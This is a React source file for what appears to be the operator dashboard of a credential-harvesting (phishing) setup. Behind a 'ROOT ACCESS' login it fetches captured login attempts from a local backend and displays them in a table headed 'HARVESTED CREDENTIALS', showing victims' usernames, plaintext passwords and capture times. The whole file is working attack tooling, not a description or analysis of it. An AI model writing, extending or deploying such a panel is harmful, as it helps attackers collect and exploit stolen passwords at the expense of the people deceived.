import React, { useState, useEffect } from 'react';

const RootUser = () => {
  const [rootId, setRootId] = useState('');
  const [rootPass, setRootPass] = useState('');
  const [loggedIn, setLoggedIn] = useState(false);
  const [attempts, setAttempts] = useState([]);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // Reset background for this specific component
  useEffect(() => {
    document.body.style.backgroundColor = '#121212';
    document.body.style.color = '#e0e0e0';
    return () => {
      document.body.style.backgroundColor = '';
      document.body.style.color = '';
    };
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('http://localhost:8000/auth/attempts', {
        method: 'GET',
        headers: {
          'x-root-id': rootId,
          'x-root-pass': rootPass
        }
      });

      if (!response.ok) {
        throw new Error('Unauthorized');
      }

      const data = await response.json();
      setAttempts(data);
      setLoggedIn(true);
    } catch (err) {
      setError('Access Denied');
    } finally {
      setLoading(false);
    }
  };

  if (!loggedIn) {
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', fontFamily: 'monospace' }}>
        <div style={{ background: '#1e1e1e', padding: '40px', borderRadius: '8px', border: '1px solid #333', width: '300px' }}>
          <h2 style={{ textAlign: 'center', marginBottom: '20px', color: '#00ff00' }}>ROOT ACCESS</h2>
          {error && <p style={{ color: 'red', textAlign: 'center', marginBottom: '10px' }}>{error}</p>}
          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
            <input 
              type="text" 
              placeholder="Root ID" 
              value={rootId}
              onChange={(e) => setRootId(e.target.value)}
              style={{ padding: '10px', background: '#000', color: '#00ff00', border: '1px solid #333' }}
              required
            />
            <input 
              type="password" 
              placeholder="Root Passkey" 
              value={rootPass}
              onChange={(e) => setRootPass(e.target.value)}
              style={{ padding: '10px', background: '#000', color: '#00ff00', border: '1px solid #333' }}
              required
            />
            <button type="submit" disabled={loading} style={{ padding: '10px', background: '#00ff00', color: '#000', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>
              {loading ? 'AUTHENTICATING...' : 'ENTER'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div style={{ padding: '40px', fontFamily: 'monospace', maxWidth: '800px', margin: '0 auto' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #333', paddingBottom: '20px', marginBottom: '20px' }}>
        <h1 style={{ color: '#00ff00' }}>HARVESTED CREDENTIALS</h1>
        <button onClick={() => setLoggedIn(false)} style={{ padding: '5px 15px', background: 'transparent', color: 'red', border: '1px solid red', cursor: 'pointer' }}>Exit</button>
      </div>
      
      <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
        <thead>
          <tr style={{ background: '#1e1e1e' }}>
            <th style={{ padding: '12px', borderBottom: '2px solid #333' }}>Username</th>
            <th style={{ padding: '12px', borderBottom: '2px solid #333' }}>Password</th>
            <th style={{ padding: '12px', borderBottom: '2px solid #333' }}>Time Captured</th>
          </tr>
        </thead>
        <tbody>
          {attempts.length === 0 ? (
            <tr>
              <td colSpan="3" style={{ padding: '20px', textAlign: 'center', color: '#888' }}>No records found in database.</td>
            </tr>
          ) : (
            attempts.map((attempt, index) => (
              <tr key={index} style={{ borderBottom: '1px solid #222' }}>
                <td style={{ padding: '12px', color: '#e0e0e0' }}>{attempt.username}</td>
                <td style={{ padding: '12px', color: '#ff4444', fontWeight: 'bold' }}>{attempt.password}</td>
                <td style={{ padding: '12px', color: '#888' }}>{new Date(attempt.timestamp).toLocaleString()}</td>
              </tr>
            ))
          )}
        </tbody>
      </table>
    </div>
  );
};

export default RootUser;
